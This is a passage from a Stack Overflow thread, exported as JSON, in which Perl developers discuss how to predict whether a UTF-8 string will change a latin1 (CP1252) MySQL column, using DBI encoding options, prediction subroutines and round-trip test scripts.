(latin1 in our case). Now all my perl logic can use UTF-8 and the DB can use latin1 and I don&#39;t have to care. Now I only need to convert all the other logic in the rest of the app to use UTF-8 encoding instead of latin1, because with latin1 encoded data, DBI now dies: <code>DBD::mysql::st execute failed: Incorrect string value: &#39;\\xE6\\xF8\\xE5&#39; for column &#39;name&#39;</code>. That conversion isn&#39;t going to be today :-)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485905481, "post_id": 41966534, "comment_id": 71117332, "body": "Inserting into an iso-latin-1 field is more like <code>SELECT CONVERT(? USING LATIN1)</code>"}], "answers": [{"comments": [{"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "edited": false, "score": 0, "creation_date": 1485899728, "post_id": 41967387, "comment_id": 71115143, "body": "I&#39;m not worried about printing out the debug data with the right encoding. I&#39;m concerned with setting the values in the database with the right encoding, and being able to detect in Perl (without a MySQL roundtrip) whether an input value would change the value in the database if an UPDATE was issued. I&#39;ll clarify the question."}], "tags": [], "owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "is_accepted": false, "score": 0, "last_activity_date": 1485896319, "creation_date": 1485896319, "answer_id": 41967387, "question_id": 41966534, "link": "https://stackoverflow.com/questions/41966534/perl-utf-8-encoding-how-to-detect-str1-eq-str2-to-avoid-mysql-round-trip/41967387#41967387", "title": "Perl UTF-8/encoding: How to detect $str1 eq $str2 to avoid MySQL round-trip?", "body": "<p>I'm not sure that you're printing out what you want to be printing out.  And I'm not sure what you're trying to achieve.  The two strings <em>are</em> the same, just represented differently.</p>\n\n<p>If we print out a bit more information by changing your <code>for</code> loop like this:</p>\n\n<pre><code>foreach my $set (\n                 [ 'str', $str ],\n                 [ 'latin', $latin1 ],\n                 [ 'utf8upgraded', $utf8upgraded ],\n                ) {\n    my ($disp, $val) = @$set;\n\n    my $hex = $val;\n    $hex =~ s/(.)/sprintf \"%X\", ord($1)/ge;\n\n    my $dumper = Data::Dumper-&gt;new([substr $val, 0, 1])-&gt;Terse(1)-&gt;Dump;\n    chomp $dumper;\n    my $mysql = mysql_roundtrip($val);\n    my $dumper_mysql = Data::Dumper-&gt;new([substr $mysql, 0, 1])-&gt;Terse(1)-&gt;Dump;\n    (my $hex_mysql = $mysql) =~ s/(.)/sprintf \"%X\", ord($1)/ge;\n    chomp $dumper_mysql;\n    printf \"%-13s: val  :%s is_utf8:%d hex:%s dumper0:%s\\n\" .\n        \"%-13s  mysql:%s is_utf8:%d hex:%s dumper1:%s\\n\",\n    $disp, $val, is_utf8($val), $hex, $dumper,\n    \"\",    $mysql, is_utf8($mysql), $hex_mysql, $dumper_mysql;\n}\n</code></pre>\n\n<p>then we get the output of whether the mysql concat output is utf8 or not, and what the hex values there are, etc.  And then, playing around to get it all working properly (see elsewhere on how much fun unicode, or encoding in general, is to play with), I made the following additional changes:</p>\n\n<ol>\n<li><code>binmode STDOUT, ':utf8';</code> to get perl to output properly</li>\n<li><code>utf8::decode($concat)</code> in your <code>mysql_roundtrip</code> function to properly decode the text back into perl's format.</li>\n</ol>\n\n<p>Once I had done these, I got val and mysql to show up the same, always as \u00e6\u00f8\u00e5.</p>\n"}, {"comments": [{"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "edited": false, "score": 0, "creation_date": 1485905736, "post_id": 41969248, "comment_id": 71117415, "body": "Thanks again, @ikegami for your time and effort. Much appreciated. Before I become stubborn and continue resistance, I&#39;ll go to bed and think about it... :-)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "edited": false, "score": 0, "creation_date": 1485906376, "post_id": 41969248, "comment_id": 71117618, "body": "Fixed a bug. <code>Encode::encode(&#39;iso-latin-1&#39;, $_)</code> considers U+0080 a valid iso-latin-1 char, but MySQL doesn&#39;t."}, {"owner": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1485951337, "post_id": 41969248, "comment_id": 71136665, "body": "@ikegami For the full CP1252 range we can create the test characters using <code>[ (join(&#39;&#39;, map decode(&#39;CP1252&#39;,encode(&#39;iso-latin-1&#39;,chr($_))), 0x00..0xFF)) x 2 ]</code>. Then substitute the 5 invalid characters using <code>$new_text =~ s&#47;[\\x{FFFD}]&#47;?&#47;g;</code>. This roundtrips with real UPDATE and SELECT. This doesn&#39;t need <code>CONVERT(? USING LATIN1)</code>,  <code>encode_utf()</code> and <code>mysql_enable_utf8mb4</code>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1485962949, "post_id": 41969248, "comment_id": 71144719, "body": "@Helmut Wollmersdorfer, You are mistaken about not needing <code>CONVERT(? USING LATIN1)</code>. If you remove the cast, you aren&#39;t simulating INSERTING into the OP&#39;s database. 2) You are mistaken about not using <code>mysql_enable_utf8mb4</code>. One is restricted as to which characters one can send when this isn&#39;t used. 3) You are mistaken about encode not being needed. One should always use <code>encode</code> (with the approporiate encoding) or <code>utf8::upgrade</code> (with <code>mysql_enable_utf8mb4</code> only) on text passed to DBI because of a design bug that can cause data corruption."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1485963085, "post_id": 41969248, "comment_id": 71144822, "body": "@Helmut Wollmersdorfer, 4) Finally, <code>s&#47;[\\x{FFFD}]&#47;?&#47;g</code> -- better written as <code>s&#47;\\x{FFFD}&#47;?&#47;g</code> or <code>s&#47;\\N{REPLACEMENT CHARACTER}&#47;?&#47;g</code>-- is nowhere near an appropriate replacement for <code>s&#47;[^\\x00-\\x7F\\x81\\x8D\\x8F\\x90\\x9D\\xA0-\\xFF]&#47;?&#47;g</code>. It doesn&#39;t even pass all of the already-provided test cases."}, {"owner": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1486012200, "post_id": 41969248, "comment_id": 71166020, "body": "@ikegami I trust your experience concerning encoding and protocol. But the regular expression does not predict the behaviour of codepoints above <code>\\xFF</code>. E. g. \\x{20AC}, \u20ac, \\N{EURO SIGN} will be stored as \\x80, and roundtrips (UTF-8 -&gt; CP1252 -&gt; UTF-8). This behaviour is of practical relevance, because (MS Windows) users insert the characters specific to CP1252 often. Thus <code>$prediction = decode(&#39;CP1252&#39;,encode(&#39;CP1252&#39;,$unicode_string));</code>is a more complete prediction. What it does not catch exactly are the 5 codepoints <code>[\\x81\\x8D\\x8F\\x90\\x9D]</code>, which can be stored in MySQL-Latin1."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1486064999, "post_id": 41969248, "comment_id": 71197626, "body": "@Helmut Wollmersdorfer, You are right that the charset MySQL calls latin1 is actually cp1252 (though the non-latin1 codepoints of cp1252 are 20AC, 201A, 192, etc; not 80, 82, 83, etc). Fixed."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1486065096, "last_edit_date": 1486065096, "creation_date": 1485904541, "answer_id": 41969248, "question_id": 41966534, "link": "https://stackoverflow.com/questions/41966534/perl-utf-8-encoding-how-to-detect-str1-eq-str2-to-avoid-mysql-round-trip/41969248#41969248", "title": "Perl UTF-8/encoding: How to detect $str1 eq $str2 to avoid MySQL round-trip?", "body": "<p>When you try to place a character in an iso-latin-1 field and the character isn't in the Windows-1252 charset, a question mark is inserted instead.</p>\n\n<p>So assuming you properly send the text to the database<sup>[1]</sup>, the following will work:</p>\n\n<pre><code>sub will_change_db_virtual {\n   my ($current_text, $new_text) = @_;\n\n   state $re;\n   if (!$re) {\n      my $cp1252_charset = decode('cp1252', (join '', map chr, 0x00..0xFF), sub { \"\" });\n      $re = qr/[^\\Q$cp1252_charset\\E]/;\n   }\n\n   $new_text =~ s/$re/?/g;\n   return $new_text ne $current_text;\n}\n</code></pre>\n\n<p>Test:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse utf8;                             # Source code encoded using UTF-8.\nuse open ':std', ':encoding(UTF-8)';  # Terminal uses UTF-8.\n\nuse strict;\nuse warnings;\nuse 5.010;\n\nuse DBI;\nuse Encode qw( decode encode encode_utf8 );\n\nsub mysql_roundtrip {\n    my ($val) = @_;\n\n    my $dbh = DBI-&gt;connect(\n        'dbi:mysql:...', '...', '...',\n        {\n            PrintError =&gt; 1,\n            RaiseError =&gt; 1,\n            mysql_enable_utf8 =&gt; 1,     # Decodes string received from the DB.\n            mysql_enable_utf8mb4 =&gt; 1,  # Sets the encoding used for the connection.\n        },\n    );\n\n    my $got = $dbh-&gt;selectrow_array(\n        'SELECT CONVERT(? USING LATIN1)',\n        undef,\n        encode_utf8($val),\n    );\n\n    return $got;\n}\n\nsub will_change_db_real {\n   my ($current_text, $new_text) = @_;\n   return mysql_roundtrip($new_text) ne $current_text;\n}\n\nsub will_change_db_virtual {\n   my ($current_text, $new_text) = @_;\n\n   state $re;\n   if (!$re) {\n      my $cp1252_charset = decode('cp1252', (join '', map chr, 0x00..0xFF), sub { \"\" });\n      $re = qr/[^\\Q$cp1252_charset\\E]/;\n   }\n\n   $new_text =~ s/$re/?/g;\n   return $new_text ne $current_text;\n}\n\nmy @tests = (\n    [ \"abcd\\x{000E9}fg\", \"abcd\\x{000E9}fg\" ],\n    [ \"abcd\\x{00113}fg\", \"abcd\\x{00113}fg\" ],\n    [ \"abcd?fg\",         \"abcd\\x{00113}fg\" ],\n    [ ( decode('cp1252', (join '', map chr, 0x00..0xFF), sub { \"\" }) ) x 2 ],\n);\n\nfor (@tests) {\n    my ($current_text, $new_text) = @$_;\n\n    my $got_real = will_change_db_real($current_text, $new_text);\n    my $got_virtual = will_change_db_virtual($current_text, $new_text);\n\n    printf(\"current:%vX new:%vX changed? real:%d virtual:%d result:%s\\n\",\n        $current_text,\n        $new_text,\n        $got_real ? 1 : 0,\n        $got_virtual ? 1 : 0,\n        ($got_real ? 1 : 0) ^ ($got_virtual ? 1 : 0) ? \"fail\" : \"pass\"\n    );\n}\n</code></pre>\n\n<p>Test output:</p>\n\n<pre><code>current:61.62.63.64.E9.66.67 new:61.62.63.64.E9.66.67 changed? real:0 virtual:0 result:pass\ncurrent:61.62.63.64.113.66.67 new:61.62.63.64.113.66.67 changed? real:1 virtual:1 result:pass\ncurrent:61.62.63.64.3F.66.67 new:61.62.63.64.113.66.67 changed? real:0 virtual:0 result:pass\ncurrent:0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.14.15.16.17.18.19.1A.1B.1C.1D.1E.1F.20.21.22.23.24.25.26.27.28.29.2A.2B.2C.2D.2E.2F.30.31.32.33.34.35.36.37.38.39.3A.3B.3C.3D.3E.3F.40.41.42.43.44.45.46.47.48.49.4A.4B.4C.4D.4E.4F.50.51.52.53.54.55.56.57.58.59.5A.5B.5C.5D.5E.5F.60.61.62.63.64.65.66.67.68.69.6A.6B.6C.6D.6E.6F.70.71.72.73.74.75.76.77.78.79.7A.7B.7C.7D.7E.7F.20AC.FFFD.201A.192.201E.2026.2020.2021.2C6.2030.160.2039.152.FFFD.17D.FFFD.FFFD.2018.2019.201C.201D.2022.2013.2014.2DC.2122.161.203A.153.FFFD.17E.178.A0.A1.A2.A3.A4.A5.A6.A7.A8.A9.AA.AB.AC.AD.AE.AF.B0.B1.B2.B3.B4.B5.B6.B7.B8.B9.BA.BB.BC.BD.BE.BF.C0.C1.C2.C3.C4.C5.C6.C7.C8.C9.CA.CB.CC.CD.CE.CF.D0.D1.D2.D3.D4.D5.D6.D7.D8.D9.DA.DB.DC.DD.DE.DF.E0.E1.E2.E3.E4.E5.E6.E7.E8.E9.EA.EB.EC.ED.EE.EF.F0.F1.F2.F3.F4.F5.F6.F7.F8.F9.FA.FB.FC.FD.FE.FF new:0.1.2.3.4.5.6.7.8.9.A.B.C.D.E.F.10.11.12.13.14.15.16.17.18.19.1A.1B.1C.1D.1E.1F.20.21.22.23.24.25.26.27.28.29.2A.2B.2C.2D.2E.2F.30.31.32.33.34.35.36.37.38.39.3A.3B.3C.3D.3E.3F.40.41.42.43.44.45.46.47.48.49.4A.4B.4C.4D.4E.4F.50.51.52.53.54.55.56.57.58.59.5A.5B.5C.5D.5E.5F.60.61.62.63.64.65.66.67.68.69.6A.6B.6C.6D.6E.6F.70.71.72.73.74.75.76.77.78.79.7A.7B.7C.7D.7E.7F.20AC.FFFD.201A.192.201E.2026.2020.2021.2C6.2030.160.2039.152.FFFD.17D.FFFD.FFFD.2018.2019.201C.201D.2022.2013.2014.2DC.2122.161.203A.153.FFFD.17E.178.A0.A1.A2.A3.A4.A5.A6.A7.A8.A9.AA.AB.AC.AD.AE.AF.B0.B1.B2.B3.B4.B5.B6.B7.B8.B9.BA.BB.BC.BD.BE.BF.C0.C1.C2.C3.C4.C5.C6.C7.C8.C9.CA.CB.CC.CD.CE.CF.D0.D1.D2.D3.D4.D5.D6.D7.D8.D9.DA.DB.DC.DD.DE.DF.E0.E1.E2.E3.E4.E5.E6.E7.E8.E9.EA.EB.EC.ED.EE.EF.F0.F1.F2.F3.F4.F5.F6.F7.F8.F9.FA.FB.FC.FD.FE.FF changed? real:1 virtual:1 result:pass\n</code></pre>\n\n<hr>\n\n<ol>\n<li>You don't in your example. You don't encode the values passed to execute according to the encoding used by the connection.</li>\n</ol>\n"}, {"comments": [{"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "edited": false, "score": 0, "creation_date": 1486061291, "post_id": 41986355, "comment_id": 71195506, "body": "Another solution with the <code>mysql_enable_utf8 =&gt; 1, mysql_enable_utf8mb4 =&gt; 1</code> options. My handles <i>don&#39;t</i> have that.... And I&#39;d <i>really</i> like to avoid that because spread over 300 k lines of perl code values are latin1 encoded before sending to the database, not utf8 encoded. As the answer from @ikegami also pointed out, setting these options makes it predictable, but it introduces unacceptable regressions for us. :-( I&#39;ve edited the question to be explicit about not having the <code>mysql_enable_utf8 =&gt; 1, mysql_enable_utf8mb4 =&gt; 1</code> options."}, {"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "edited": false, "score": 0, "creation_date": 1486066509, "post_id": 41986355, "comment_id": 71198410, "body": "Also, the <code>mysql_enable_utf8</code> option is marked as exprimental in <code>perldoc DBD::mysql</code> from Debian stable. The experimental status was only <a href=\"https://anonscm.debian.org/cgit/pkg-perl/packages/libdbd-mysql-perl.git/commit/?id=026fa02d80afc7f3473e67b9f63fe1b74575da3e\" rel=\"nofollow noreferrer\">lifted in May 2016</a>. But I wish we had used it from the start... :-("}, {"owner": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "reply_to_user": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "edited": false, "score": 0, "creation_date": 1486162936, "post_id": 41986355, "comment_id": 71243179, "body": "I use <code>mysql_enable_utf8 =&gt; 1</code> in production on Debian 6, 7 and 8."}, {"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "edited": false, "score": 0, "creation_date": 1486312636, "post_id": 41986355, "comment_id": 71281200, "body": "Sure. The perldoc for <code>mysql_enable_utf8</code> does also say that &quot;This attribute determines whether DBD::mysql should assume strings stored in the database are utf8.&quot; and &quot;This option is experimental&quot;, right? Apparently it is fine to ignore these two sentences, but I just wanted to point out that I did RTFM! :-) Again, I wish we had gone the <code>mysql_enable_utf8</code> route, but that ship has sailed..."}], "tags": [], "owner": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "is_accepted": false, "score": 1, "last_activity_date": 1486031048, "last_edit_date": 1486031048, "creation_date": 1485971390, "answer_id": 41986355, "question_id": 41966534, "link": "https://stackoverflow.com/questions/41966534/perl-utf-8-encoding-how-to-detect-str1-eq-str2-to-avoid-mysql-round-trip/41986355#41986355", "title": "Perl UTF-8/encoding: How to detect $str1 eq $str2 to avoid MySQL round-trip?", "body": "<p>According to the <a href=\"https://dev.mysql.com/doc/refman/5.7/en/charset-we-sets.html\" rel=\"nofollow noreferrer\">MySQL documentation</a> MySQL stores the character range of CP1251 encoding if configured for Latin1, i. e. UTF-8 is converted to CP1251. Characters not assigned in CP1252 change to a question mark. Code points <code>[\\x81\\x8D\\x8F\\x90\\x9D]</code> are stored unchanged.</p>\n\n<p>The simplest way for a prediction is to implement the same behaviour in a subroutine <code>prediction()</code>. It can help to detect following situations:</p>\n\n<pre><code>my $predict = predict($new_string);\nif ($new_string ne $predict) {\n  print \"WARN: $new_string will not sore correctly in DB\\n\";\n}\nelsif ($existing_db_string ne $predict) {\n  print \"INFO: $new_string will change DB string\\n\";\n}\n</code></pre>\n\n<p>Roundtrip test over a large range of characters:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse utf8;\nuse open ':std', ':encoding(UTF-8)';  # Terminal uses UTF-8.\n\nuse strict;\nuse warnings;\nuse 5.010;\n\nuse DBI;\nuse Encode qw( decode encode encode_utf8 );\n\nsub mysql_roundtrip {\n  my ($val) = @_;\n\n  my $dbh = DBI-&gt;connect(\n    'DBI:mysql:database=testlat;host=192.168.1.3;port=3306',\n    'userid',\n    'passwd',\n    {\n        PrintError =&gt; 1,\n        AutoCommit =&gt; 1,\n        RaiseError =&gt; 1,\n        mysql_enable_utf8 =&gt; 1,\n        mysql_enable_utf8mb4 =&gt; 1, \n    }\n  ) or die $DBI::errstr;\n\n  my $sql = 'UPDATE testlat SET name = ? WHERE id = 1;';\n  my $dbz = $dbh-&gt;do($sql, undef, encode_utf8($val));\n\n  my ($got) = $dbh-&gt;selectrow_array('SELECT name FROM testlat WHERE id=1');\n\n  return $got;\n}\n\nsub predict {\n  my $uni_string = shift;\n\n  my @chars = split(//,$uni_string);\n  my @predict;\n  for my $char (@chars) {\n    if ($char =~ /[\\x81\\x8D\\x8F\\x90\\x9D]/) {\n      push @predict, $char;\n    }\n    else {\n      my $predict = decode('CP1252',encode('CP1252',$char));\n      if ($predict ne $char) { $predict = '?'; }\n      push @predict, $predict;\n    }\n  }\n  return join('',@predict);\n}\n\nmy $fails = 0;\nprint \"*** test via database \\n\";\nfor my $number (0x00..0x2122) {\n  my $uni_char = chr($number);\n  my $predict = predict($uni_char);\n\n  my $got = mysql_roundtrip($uni_char);\n\n  if ($predict ne $got) {\n    $fails++;\n    printf(\"FAIL uni:%.4X predict:%.4X got:%.4X\\n\",\n      $number,\n      ord($predict),\n      ord($got)\n    );\n  }\n}\n\nprint \"FAILS: $fails\\n\";\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$ perl utf8_latin1_mysql_test2.pl\n*** test via database \nFAILS: 0\n</code></pre>\n\n<p>This passes the tests for code points <code>0x00..0x2122</code> and can be expected to work for the whole Unicode range.</p>\n"}, {"comments": [{"owner": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1486161342, "post_id": 42025155, "comment_id": 71242697, "body": "Do I understand correctly: Most of your 300 k lines of old code in Latin1 mode will store <code>&#248;</code> as one byte <code>F8</code> and the new code will store <code>&#248;</code> as UTF-8 encoded 2 bytes <code>C3B8</code>? And both old and new code will read and write the same fields of the database?"}, {"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "reply_to_user": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1486309743, "post_id": 42025155, "comment_id": 71280182, "body": "No, both old and new code store <code>&#248;</code> as <code>F8</code>. Further, we had a bug where UTF-8 input was not encoded as Latin1. Easily fixed. A side effect was that there was a <code>if ($new_value ne $old_value) { fork_background_process }</code> that got forked often because of the misencoding, where it was only supposed to fork off for database changes. I wanted to fix that too, leading to this question."}], "tags": [], "owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "is_accepted": true, "score": 1, "last_activity_date": 1486127518, "creation_date": 1486127518, "answer_id": 42025155, "question_id": 41966534, "link": "https://stackoverflow.com/questions/41966534/perl-utf-8-encoding-how-to-detect-str1-eq-str2-to-avoid-mysql-round-trip/42025155#42025155", "title": "Perl UTF-8/encoding: How to detect $str1 eq $str2 to avoid MySQL round-trip?", "body": "<p>Here is the solution we're going with (for now at least):</p>\n\n<pre><code>sub mysql_value_latin1 {\n    my ($val) = @_;\n    # See text - this looks strange - but works!\n    if (is_utf8($val)) {\n        $val = encode('utf8', $val);\n    } else {\n        $val = encode('latin1', $val);\n    }\n    return $val;\n}\n\nsub new_value_will_change_database {\n    my ($current_value, $new_value) = @_;\n    my $mysql_new_value = mysql_value_latin1($new_value);\n    return $current_value ne $mysql_new_value;\n}\n</code></pre>\n\n<p>Thanks @ikegami and @HelmutWollmersdorfer for your input on this issue. You both suggest these options for the <code>$dbh</code>:</p>\n\n<pre><code>mysql_enable_utf8 =&gt; 1,     # Decodes string received from the DB.\nmysql_enable_utf8mb4 =&gt; 1,  # Sets the encoding used for the connection.\n</code></pre>\n\n<p>As I've pointed out that will cause an unpredictable amount of regressions in our code base since the handles are shared by many libraries.</p>\n\n<p>The advantages of <code>mysql_enable_utf8 =&gt; 1</code> are clear: Perl code sends correctly encoded UTF-8 data to MySQL, which then converts it to Latin1 (CP 1252) and puts it in the database. We are guaranteed that data is stored properly, and we can use UTF-8 in Perl, not caring about the Latin1-ness of the database.</p>\n\n<p>There are disadvantages also: Any data that is not valid UTF-8 will be rejected by <code>DBI</code> or <code>DBD::mysql</code> (I'm not clear which), and my testing has also shown that MySQL will reject storing data in a Latin1 table that isn't valid Latin1 (CP 1252).  So we need to be more explicit about encoding our data before sending it to the database - probably a good thing actually.</p>\n\n<p><code>mysql_enable_utf8 =&gt; 0</code> appears to behave quite strangely. It appears, that if the UTF-8 flag on Perl scalars is set, then data will be UTF-8 encoded and otherwise data will be left at Perl's internal encoding (ISO-8859-1/Latin1). This data is then sent to MySQL and stored in the Latin1 table, wether or not the data actually is valid CP 1252 data. With <code>mysql_enable_utf8 =&gt; 0</code> I was able to store all chars in 0x00-0xFF without problems, even though some are not valid CP 1252 characters.</p>\n\n<p>If anybody can find a failing test for <code>@tests</code>, please let me know.</p>\n\n<p>The task at hand in the OP was to predict whether a given scalar would change the value of the database if handed to MySQL for an UPDATE, and the <code>sub new_value_will_change_database</code> does exactly that - without changing properties of the <code>$dbh</code>. That is why I prefer this solution to the OP.</p>\n\n<p>I do agree that a better technical solution is to go the <code>mysql_enable_utf8 =&gt; 1</code> route, but it is also the poorer business decision because of the effort involved to address the (potential) regressions.</p>\n\n<h2>Fuller Debugging Script</h2>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse utf8;\nuse strict;\nuse feature qw(:5.10);\n\nuse Encode qw(encode is_utf8);\nuse DBI;\nuse Data::Dumper;\n\nmy $str = '\u00e6\u00f8\u00e5';\n\nmy $latin1 = encode('latin1', $str);\n\nmy $utf8upgraded = $latin1;\nutf8::upgrade($utf8upgraded);\n\n# $str, $latin1 and $utf8upgraded are all eq each other:\n$str eq $latin1\n    or die;\n$str eq $utf8upgraded\n    or die;\n$latin1 eq $utf8upgraded\n    or die;\n\nmy $dbh = DBI-&gt;connect(\n    \"DBI:mysql:mysql\",\n    'user',\n    'pass',\n);\n\n$dbh-&gt;do(q(\n    CREATE TEMPORARY TABLE test (\n        name VARCHAR(255) DEFAULT NULL\n    ) CHARSET=latin1;\n));\n$dbh-&gt;do(q(\n    INSERT INTO test (name) VALUES ('');\n));\n\nsub mysql_roundtrip_convert {\n    my ($val) = @_;\n    my $sth = $dbh-&gt;prepare('SELECT CONVERT(? USING LATIN1)');\n    $sth-&gt;execute($val);\n    my ($concat) = $sth-&gt;fetchrow_array();\n    return $concat;\n}\n\nsub mysql_roundtrip_column {\n    my ($val) = @_;\n    my $updateSth = $dbh-&gt;prepare('update test set name=?');\n    $updateSth-&gt;execute($val);\n    my $getSth = $dbh-&gt;prepare('select name from test');\n    $getSth-&gt;execute();\n    my ($value) = $getSth-&gt;fetchrow_array();\n    return $value;\n};\n\nsub mysql_roundtrip {\n    my ($val) = @_;\n    # Check that these two are the identical:\n    my $column = mysql_roundtrip_column($val);\n    my $convert = mysql_roundtrip_convert($val);\n    $column eq $convert\n        or die \"column ne convert\";\n    return $column;\n}\n\nsub mysql_value_latin1 {\n    my ($val) = @_;\n    # See text - this 